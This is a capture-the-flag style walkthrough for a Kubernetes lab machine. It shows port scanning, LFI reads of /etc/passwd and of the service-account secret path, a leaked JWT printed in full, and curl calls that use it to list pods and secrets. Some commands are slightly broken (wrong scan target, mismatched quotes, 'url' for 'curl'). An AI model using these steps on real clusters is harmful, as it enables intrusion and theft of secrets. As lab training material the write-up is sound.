# Island Orchestration

lhost = `ip a s | grep tun0 | grep -oP '\s\d+\.\d+\.\d+\.\d+'`<br>
rhost = 10.10.172.48<br>

## Concepts
>Web Enumeration<br>
Kubernetes<br>
LFI<br>
php filters<br>
Defaiult configurations<br>

## Tools
>fuff<br>
whatweb<br>
nmap<br>
gobuster<br>
rustscan<br>

## Related articles
<url>https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3</url>




## Enumeration

```powershell
nmap $lhost -A -oN nmap.log
rustscan $lhost
```

## Web Enumeration
```bash
whatweb $rhost
```

## Leverage LFI
```bash
/etc/hosts # This confirms we are in a kubernete
/etc/hostname
/etc/passwd
```



Because we are in a KUbernete is worth to check this:
`/var/run/secrets/kubernetes.io/serviceaccount`<br>
```bash
ffuf -u "http://$rhost/?page=../../../../../var/run/secrets/kubernetes.io/serviceaccount/FUZZ' -w '/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt" -fw 1126 # -fw 1126 helps filter the results
```


<details>

<summary>Get the token</summary>

```bash
export JWT=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3ODk3NDU1LCJpYXQiOjE2NTYzNjE0NTUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2MzY1MDYyfSwibmJmIjoxNjU2MzYxNDU1LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.WHEy55ihmtvSEBAgJKQHopZmG-YB0lDBGCxyLHR5b_1DT9leBz3Va9hwvX0-IMFi3p_MbmtWSdMdteaBpyuFIWhqf2oqflJ2H0KuTjEUcQWlT_6LybEuSbtFPLxjw_TE0bTodtJ-hltXw7SidzmFXTVF3Rh0R4Si5J0vjoidDqMD9CaPTOq8QwXdoEatYUDJH1_WVRjRSZH5hkmo7_QOSk1Ae9gBKJ_Zt82EHvB9CY62MhUfSPAtSdro_Z11096IflR_sm-zEmtU2ZeVbEL3QWUZGdRwC5MJVAyDb6W3r8Q9hENR1cTOPbjBe-tYI8npTHrqjqj7DtrTkEhzFyHnOw 
```

</details>
<br>


Decode the token using a web tool <url>https://jwt.io/</url> to verify is valid

Now with the token we can request further info from the API endpoint
List Pods:
```bash
curl -v -H “Authorization: Bearer $JWT” https://$rhost:8443/api/v1/namespaces/default/pods/
```

List secrets:
```bash
curl -v -H “Authorization: Bearer $JWT” https://$rhost:8443/api/v1/namespaces/default/secrets/
```

List deployments:
```bash
curl -v -H “Authorization: Bearer $JWT” https://$rhost:8443/apis/extensions/v1beta1/namespaces/default/deployments
```

List daemonsts:
```bash
url -v -H “Authorization: Bearer $JWT” https://$rhost:8443/apis/extensions/v1beta1/namespaces/default/daemonsets
```
